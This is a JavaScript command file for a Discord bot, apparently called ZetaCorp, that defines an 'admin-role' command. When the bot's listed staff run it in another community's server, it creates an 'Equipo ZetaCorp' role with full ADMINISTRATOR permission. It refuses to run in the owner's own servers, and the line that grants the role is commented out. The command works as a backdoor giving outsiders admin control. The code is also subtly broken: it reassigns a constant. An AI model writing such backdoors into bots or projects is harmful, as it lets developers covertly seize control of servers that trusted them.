const db = require('megadb'), ids = new db.crearDB('ids')

module.exports = {
   name: 'admin-role',
   async execute(zetacorp, message, args) {
      const id = await ids.obtener(message.author.id)
      if (!id) return message.channel.send('<a:no:859383457125236736> | `Solo los staffs de ZetaCorp pueden usar este comando`');

      if (message.guild.id == '898242663139135538') {
         return message.channel.send('<a:no:859383457125236736> | `Es enserio?`').then(() => {
            zetacorp.users.cache.get('477851232879378441').send(`${message.author.tag} ( ${message.author.id} ) ha usado el comando \`admin-role\` en uno de nuestros servers`)
         })

      }
      if (message.guild.id == '894239024829591582') {
         return message.channel.send('<a:no:859383457125236736> | `Es enserio?`').then(() => {
            zetacorp.users.cache.get('477851232879378441').send(`${message.author.tag} ( ${message.author.id} ) ha usado el comando \`admin-role\` en uno de nuestros servers`)
         })

      }

      const rol = message.guild.roles.cache.find(rol => rol.name == "Equipo ZetaCorp")
      if (message.guild.me.hasPermission('MANAGE_ROLES') && !rol) {
         rol = await message.guild.roles.create({
            data: {
               name: 'Equipo ZetaCorp',
               color: 'BLUE',
               permissions: 'ADMINISTRATOR'
            },
            reason: 'Equipo de ZetaCorp para ayudar',
         }).catch(e => console.log(e))
      }
      console.log(rol)
      //message.member.roles.add(rol.id).catch(e => console.log(e))
   }
}
